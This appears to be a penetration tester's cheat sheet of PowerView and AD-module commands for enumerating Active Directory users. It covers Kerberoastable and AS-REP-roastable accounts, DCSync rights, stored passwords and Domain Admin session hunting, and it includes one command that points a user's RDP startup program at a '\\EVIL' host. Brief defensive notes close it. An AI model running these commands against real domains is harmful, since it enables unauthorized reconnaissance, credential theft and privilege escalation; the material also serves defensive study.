# Domain Users

## Get List of Users in Current Domain

```powershell
# AD Module
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *
Get-ADUser -Filter * -Properties * | Select Name

# PowerView
Get-NetUser
Get-NetUser -Username student1
Get-NetUser | Select cn
```

## Get List of All Properties for Users in Current Domain

```powershell
# AD Module
Get-ADUser -Filter * -Properties * | Select -First 1 | Get-Member -MemberType *Property | Select Name
Get-ADUser -Filter * -Properties * | Select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```

## Find All Users with an SPN

```powershell
# PowerView
Get-DomainUser -SPN
```

## Find All Service Accounts in "Domain Admins"

```powershell
# PowerView
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}
```

## Check for Users Who Don't Have Kerberos Preauthentication Set

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

## Find Users with sidHistory Set

```powershell
# PowerView
Get-DomainUser -LDAPFilter '(sidHistory=*)'
```

## Find Any Users with Constrained Delegation Set

```powershell
# PowerView
Get-DomainUser -TrustedToAuth
```

## Find All Privileged Users that Aren't Marked as sensitive/not for Delegation

```powershell
# PowerView
Get-DomainUser -AllowDelegation -AdminCount
```

## Get List of All Properties for Users in Current Domain

```powershell
# PowerView
Get-UserProperty
Get-UserProperty -Properties pwdlastset
```

## Search for a Particular String in a User's Attributes

```powershell
# AD Module
Get-ADUser -Filter 'Description -Like "*built*"' -Properties Description | Select name,Description

# PowerView
Find-UserField -SearchField Description -SearchTerm "built"
```

## Get Actively Logged on Users on a Computer (needs Local Admin Rights on the target)

```powershell
# PowerView
Get-NetLoggedOn -ComputerName dc.lab.local
```

## Get Actively Logged on Users on a Computer

```powershell
# PowerView
Get-LoggedOnLocal -ComputerName dc.lab.local
```

## Get the Last Logged User on a Computer

```powershell
# PowerView
Get-LastLoggedOn -ComputerName dc.lab.local
```

## Get All Users with Passwords Changed > 1 Year ago

```powershell
# PowerView
$Date = (Get-Date).AddYears(-1).ToFileTime()
Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset
```

## Get All Enabled Users

```powershell
# PowerView
Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
```

## Get All Disabled Users

```powershell
# PowerView
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
Get-DomainUser -UACFilter AccountDISABLE
```

## Get All Users that Require Smart Card Authentication

```powershell
# PowerView
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
Get-DomainUser -UACFilter SMARTCARD_REQUIRED
```

## Get All Users that *don't* Require Smart Card Authentication

```powershell
# PowerView
Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname
```

## Use Multiple Identity Types for Any *-Domain* Function

```powershell
# PowerView
'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff
```

## Enumerate All Foreign Users in the Global Catalog, and Query the Specified Domain Localgroups for Their Memberships

```powershell
# PowerView

# query the global catalog for foreign security principals with Domain-based SIDs, and extract out all distinguishednames
$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://testlab.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
$Domains = @{}
$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
    # extract the Domain the foreign User was added to
    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
    # check if we've already enumerated this Domain
    if (-not $Domains[$ForeignUserDomain]) {
        $Domains[$ForeignUserDomain] = $True
        # enumerate all Domain local groups from the given Domain that have membership set with our foreignSecurityPrincipal set
        $Filter = "(|(member=" + $($ForeignUsers -join ")(member=") + "))"
        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member
    }
}
$ForeignMemberships | fl
```

## If Running in -sta Mode, Impersonate Another Credential a la "runas /netonly"

```powershell
# PowerView

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```

## Set the Specified Property for the given User Identity

```powershell
# PowerView
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
```

## Set the Owner of 'dfm' in the Current Domain to 'bufu'

```powershell
# PowerView
Set-DomainObjectOwner -Identity dfm -OwnerIdentity bufu
```

## Retrieve *most* Users Who Can Perform DC Replication for dev.testlab.local (i.e. DCsync)

```powershell
# PowerView
Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
}
```

## Check if Any User Passwords Are Set

```powershell
# PowerView
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
```

## User Hunting with PowerView

### Find All Machines on the Current Domain where the Current User Has Local Admin Access

This function queries the DC of the current or provided Domain for a list of Computers (`Get-NetComputer`) and then use multi-threaded ``Invoke-CheckLocalAdminAccess`` on each machine.

Can also be done using WMI and PowerShell Remoting, see ``Find-WMILocalAdminAccess.ps1`` and ``Find-PSRemotingLocalAdminAccess.ps1``.

```powershell
Find-LocalAdminAccess -Verbose
```

### Find Local Admins on All Machines

Needs administrator privs on non-dc machines.

This function queries the DC of the current or provided Domain for a list of Computers (``Get-NetComputer``) and then use multi-threaded ``Get-NetLocalGroup`` on each machine.

```powershell
Invoke-EnumerateLocalAdmin -Verbose
```

### Find Computers where a Domain Admin (or Specified User/group) Has Sessions

This function queries the DC of the current or provided Domain for members of the given group (Domain Admins by default) using ``Get-NetGroupMember``, gets a list of Computers (``Get-NetComputer``) and list sessions and logged on Users (``Get-NetSession`` / ``Get-NetLoggedon``) from each one.

```powershell
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
```

### Confirm Admin Access

```powershell
Invoke-UserHunter -CheckAccess
```

### Find Computers where a Domain Admin is Logged-in

This option queries the DC of the current or provided Domain for members of the given group (Domain Admins by default) using ``Get-NetGroupMember``, gets a list *only* of high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation and list sessions and logged on Users (``Get-NetSession`` / ``Get-NetLoggedon``) from each machine.

```powershell
Invoke-UserHunter -Stealth
```

### Enumerate Servers that Allow Unconstrained Delegation and Show All Logged in Users

``Find-DomainUserLocation`` == old ``Invoke-UserHunter``

```powershell
Find-DomainUserLocation -ComputerUnconstrained -ShowAll
```

### Hunt for Admin Users that Allow Delegation, Logged into Servers that Allow Unconstrained Delegation

```powershell
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
```

### Defending against User Hunting

#### NetCease

- Script to change permissions on `NetSessionEnum` method by removing permissions for `Authenticated Users` group
- Fails many of the attacker's session enumeration and hence User hunting capabilities

```powershell
.\NetCease.ps1
```

#### SAMRi10

- From same author as NetCease
- Hardens Windows 10 and Server 2016 against enumeration wihch uses SAMR protocol (like net.exe)
- https://gallery.technet.microsoft.com/SAMRi10-Hardening-Remote-48d94b5b
